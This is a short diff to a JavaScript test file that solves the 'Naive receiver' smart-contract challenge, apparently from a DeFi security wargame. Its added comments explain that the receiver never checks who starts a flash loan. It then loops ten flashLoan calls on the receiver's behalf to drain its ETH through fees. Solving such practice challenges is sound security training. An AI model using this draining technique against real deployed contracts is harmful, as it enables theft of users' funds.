@@ -38,6 +38,11 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // The flash loan can be called on any contract and the receiver contract does not check who started a flash loan
+        // This allows the attacker to call the flash loan multiple times for the receiver and drain the receiver's eth
+        for (let i = 0; i < 10; i++) {
+            await pool.flashLoan(receiver.address, "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", ETHER_IN_POOL, "0x00");
+        }
     });
 
     after(async function () {
